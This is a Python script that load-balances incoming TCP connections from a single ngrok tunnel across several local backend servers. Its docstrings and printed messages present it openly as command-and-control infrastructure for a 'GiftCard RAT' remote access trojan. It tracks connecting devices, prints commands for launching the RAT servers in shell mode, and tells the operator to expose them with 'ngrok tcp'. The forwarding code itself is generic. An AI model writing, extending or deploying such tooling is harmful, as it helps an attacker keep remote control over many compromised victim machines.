#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Ngrok Load Balancer for GiftCard RAT
Forwards connections from single ngrok URL to multiple backend RAT servers
"""

import socket
import threading
import random
import time
import sys
import json
from pathlib import Path
from datetime import datetime

class NgrokLoadBalancer:
    def __init__(self, listen_port=8888, backend_ports=[8889, 8890, 8891, 8892]):
        self.listen_port = listen_port
        self.backend_ports = backend_ports
        self.active_backends = []
        self.connection_count = 0
        self.client_connections = {}
        self.device_to_backend = {}  # Track which device goes to which backend
        self.backend_usage = {port: 0 for port in backend_ports}  # Track backend usage
        
    def check_backend_health(self):
        """Check which backend servers are available"""
        self.active_backends = []
        for port in self.backend_ports:
            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(2)
                result = test_socket.connect_ex(('localhost', port))
                test_socket.close()
                
                if result == 0:
                    self.active_backends.append(port)
            except:
                pass
        return len(self.active_backends) > 0
    
    def get_available_backend(self, client_id=None):
        """Get backend server - sticky session based on client IP if available"""
        if not self.check_backend_health():
            return None
        
        # If this client has connected before, try to use the same backend
        if client_id and client_id in self.device_to_backend:
            preferred_backend = self.device_to_backend[client_id]
            if preferred_backend in self.active_backends:
                return preferred_backend
        
        # Otherwise, use least-loaded backend (instead of random)
        available_backends = [(port, self.backend_usage[port]) for port in self.active_backends]
        available_backends.sort(key=lambda x: x[1])  # Sort by usage count
        selected_backend = available_backends[0][0]
        
        # Track this assignment
        if client_id:
            self.device_to_backend[client_id] = selected_backend
        
        return selected_backend
    
    def handle_client(self, client_socket, client_addr):
        """Forward client connection to available backend"""
        client_id = f"{client_addr[0]}:{client_addr[1]}"
        client_ip = client_addr[0]  # Just the IP for sticky sessions
        self.connection_count += 1
        connection_num = self.connection_count
        
        backend_port = self.get_available_backend(client_ip)
        
        if not backend_port:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ No backend servers available for {client_id}")
            try:
                client_socket.close()
            except:
                pass
            return
        
        # Increment backend usage counter
        self.backend_usage[backend_port] = self.backend_usage.get(backend_port, 0) + 1
        
        try:
            # Connect to backend server
            backend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backend_socket.settimeout(10)
            backend_socket.connect(('localhost', backend_port))
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔄 Connection #{connection_num}: {client_id} -> Backend Port {backend_port}")
            
            # Store connection info
            self.client_connections[connection_num] = {
                'client_addr': client_addr,
                'backend_port': backend_port,
                'start_time': datetime.now()
            }
            
            # Start forwarding data in both directions
            client_to_backend = threading.Thread(
                target=self.forward_data,
                args=(client_socket, backend_socket, f"C{connection_num}->B{backend_port}", connection_num)
            )
            backend_to_client = threading.Thread(
                target=self.forward_data,
                args=(backend_socket, client_socket, f"B{backend_port}->C{connection_num}", connection_num)
            )
            
            client_to_backend.daemon = True
            backend_to_client.daemon = True
            
            client_to_backend.start()
            backend_to_client.start()
            
            # Wait for either connection to close
            client_to_backend.join()
            backend_to_client.join()
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Error forwarding connection #{connection_num}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
            try:
                backend_socket.close()
            except:
                pass
            
            # Remove from active connections and decrement backend usage
            if connection_num in self.client_connections:
                duration = datetime.now() - self.client_connections[connection_num]['start_time']
                backend_port = self.client_connections[connection_num]['backend_port']
                self.backend_usage[backend_port] = max(0, self.backend_usage[backend_port] - 1)
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔌 Connection #{connection_num} closed (duration: {duration})")
                del self.client_connections[connection_num]
    
    def forward_data(self, source, destination, label, connection_num):
        """Forward data from source to destination socket"""
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                destination.send(data)
        except Exception as e:
            # Connection closed is expected, don't spam logs
            pass
    
    def print_status(self):
        """Print status information"""
        while True:
            try:
                time.sleep(30)  # Print status every 30 seconds
                self.check_backend_health()
                active_connections = len(self.client_connections)
                
                print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 📊 Load Balancer Status:")
                print(f"  Active backends: {len(self.active_backends)}/{len(self.backend_ports)} (ports: {self.active_backends})")
                print(f"  Backend load: {dict(self.backend_usage)}")
                print(f"  Active connections: {active_connections}")
                print(f"  Total connections handled: {self.connection_count}")
                print(f"  Sticky sessions tracked: {len(self.device_to_backend)}")
                
                if active_connections > 0:
                    print("  Current connections:")
                    for conn_id, info in self.client_connections.items():
                        duration = datetime.now() - info['start_time']
                        print(f"    #{conn_id}: {info['client_addr']} -> Port {info['backend_port']} ({duration})")
                
                print("-" * 50)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Status thread error: {e}")
    
    def start_loadbalancer(self):
        """Start the load balancer server"""
        # Check if backend servers are running
        print("🔍 Checking backend servers...")
        if not self.check_backend_health():
            print("❌ No backend servers are running!")
            print("Please start your RAT servers first:")
            for port in self.backend_ports:
                print(f"   python giftcard-rat.py --shell -i 127.0.0.1 -p {port}")
            print("\nThen run this load balancer again.")
            return
        
        print(f"✅ Found {len(self.active_backends)} active backend servers: {self.active_backends}")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind(('0.0.0.0', self.listen_port))
            server_socket.listen(20)
            
            print(f"\n🚀 GiftCard RAT Load Balancer Started")
            print(f"📡 Listening on: 0.0.0.0:{self.listen_port}")
            print(f"🎯 Backend servers: {self.backend_ports}")
            print(f"✅ Active backends: {self.active_backends}")
            print("=" * 60)
            print("💡 Now start your ngrok tunnel:")
            print(f"   ngrok tcp {self.listen_port}")
            print("=" * 60)
            
            # Start status monitoring thread
            status_thread = threading.Thread(target=self.print_status)
            status_thread.daemon = True
            status_thread.start()
            
            while True:
                try:
                    client_socket, client_addr = server_socket.accept()
                    
                    # Handle each client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except Exception as e:
                    print(f"Accept error: {e}")
                    
        except KeyboardInterrupt:
            print("\n\n🛑 Stopping load balancer...")
        except Exception as e:
            print(f"❌ Load balancer error: {e}")
        finally:
            server_socket.close()
            print("👋 Load balancer stopped.")

def load_config():
    """Load configuration from server_config.json"""
    config_file = Path("server_config.json")
    if config_file.exists():
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"[WARNING] Failed to load server_config.json: {e}")
    return None

def main():
    print("🎯 GiftCard RAT Ngrok Load Balancer")
    print("=" * 40)
    
    # Try to load config from file
    config = load_config()
    
    # Default values
    NGROK_PORT = 8888
    BACKEND_PORTS = [8889, 8890, 8891, 8892]
    
    # Use config file if available
    if config:
        if 'loadbalancer' in config:
            NGROK_PORT = config['loadbalancer'].get('listen_port', 8888)
            BACKEND_PORTS = config['loadbalancer'].get('backend_ports', [8889, 8890, 8891, 8892])
            print("[INFO] Using configuration from server_config.json")
        if 'ngrok' in config:
            print(f"📡 Expected Ngrok URL: {config['ngrok']['ip']}:{config['ngrok']['port']}")
    
    # Command line arguments override config file
    if len(sys.argv) > 1:
        try:
            NGROK_PORT = int(sys.argv[1])
            print(f"📡 Using custom ngrok port from command line: {NGROK_PORT}")
        except:
            print("❌ Invalid port specified, using default/config value")
    
    if len(sys.argv) > 2:
        try:
            backend_start = int(sys.argv[2])
            BACKEND_PORTS = [backend_start + i for i in range(4)]
            print(f"🎯 Using custom backend ports from command line: {BACKEND_PORTS}")
        except:
            print("❌ Invalid backend start port, using default/config value")
    
    print(f"📡 Load Balancer Port: {NGROK_PORT}")
    print(f"🎯 Backend Ports: {BACKEND_PORTS}")
    print("=" * 40)
    
    loadbalancer = NgrokLoadBalancer(NGROK_PORT, BACKEND_PORTS)
    loadbalancer.start_loadbalancer()

if __name__ == "__main__":
    main()